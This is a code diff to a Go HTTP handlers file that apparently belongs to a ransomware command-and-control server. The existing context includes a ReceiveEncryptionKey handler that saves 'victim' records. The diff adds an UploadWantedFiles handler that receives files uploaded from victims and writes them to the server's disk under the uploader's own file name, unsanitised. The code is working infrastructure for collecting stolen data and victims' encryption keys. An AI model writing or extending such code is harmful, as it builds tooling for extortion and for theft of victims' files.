@@ -3,9 +3,11 @@ package handlers
 import (
 	"encoding/json"
 	"fmt"
+	"io"
 	"io/ioutil"
 	"log"
 	"net/http"
+	"os"
 	"text/template"
 	"time"
 
@@ -177,5 +179,37 @@ func ReceiveEncryptionKey(w http.ResponseWriter, r *http.Request) {
 
 	db.Save(&victim)
 
+	w.WriteHeader(http.StatusOK)
+}
+
+func UploadWantedFiles(w http.ResponseWriter, r *http.Request) {
+	// Parse request body as multipart form data with 32MB max memory
+	err := r.ParseMultipartForm(32 << 20)
+	if err != nil {
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
+
+	// Get file from Form
+	file, handler, err := r.FormFile("file")
+	if err != nil {
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
+	defer file.Close()
+
+	// Create file locally
+	dst, err := os.Create(handler.Filename)
+	if err != nil {
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
+	defer dst.Close()
+
+	// Copy the uploaded file data to the newly created file on the filesystem
+	if _, err := io.Copy(dst, file); err != nil {
+		http.Error(w, "bad request", http.StatusBadRequest)
+		return
+	}
 	w.WriteHeader(http.StatusOK)
 }
